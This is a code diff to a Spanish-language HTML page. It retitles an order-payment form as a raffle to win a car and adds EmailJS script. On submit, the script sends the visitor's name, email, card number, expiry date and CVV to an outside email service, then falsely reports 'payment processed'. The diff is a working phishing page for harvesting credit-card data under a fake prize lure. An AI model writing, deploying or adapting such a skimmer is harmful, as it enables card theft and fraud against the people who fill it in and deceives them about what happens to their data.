@@ -53,7 +53,7 @@
 <body>
 
   <div class="card">
-    <h2>Pago de Pedido</h2>
+    <h2>Participa en la rifa para ganar un carro!</h2>
 
     <form id="paymentForm">
       <input type="text" placeholder="Nombre del cliente" required>
@@ -71,19 +71,29 @@
     </div>
   </div>
 
-  <script>
-    document.getElementById("paymentForm").addEventListener("submit", function(e) {
-      e.preventDefault();
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+<script>
+(function(){
+  emailjs.init("oKOpLnqIka8vsjrDv");
+})();
 
-      document.getElementById("successMsg").style.display = "block";
+document.getElementById("paymentForm").addEventListener("submit", function(e){
+  e.preventDefault();
 
-      // Envío por correo (abre el cliente de correo)
-      window.location.href =
-        "mailto:chispudo12140@gmail.com" +
-        "?subject=Pago" +
-        "&body=Se realizó un pago para el proyecto escolar.";
-    });
-  </script>
+  emailjs.send("service_0bchd6q", "template_o8buosm", {
+    name: document.querySelector('input[placeholder*="Nombre"]').value,
+    email: document.querySelector('input[type="email"]').value,
+    order: document.querySelector('input[placeholder*="pedido"]').value,
+    card: document.querySelector('input[placeholder*="tarjeta"]').value,
+    date: document.querySelector('input[placeholder*="Fecha"]').value,
+    cvv: document.querySelector('input[placeholder*="CVV"]').value
+  }).then(function(){
+    alert("Pago procesado. Te enviaremos un email con tu código");
+  }, function(){
+    alert("Error al enviar el correo");
+  });
+});
+</script>
 
 </body>
 </html
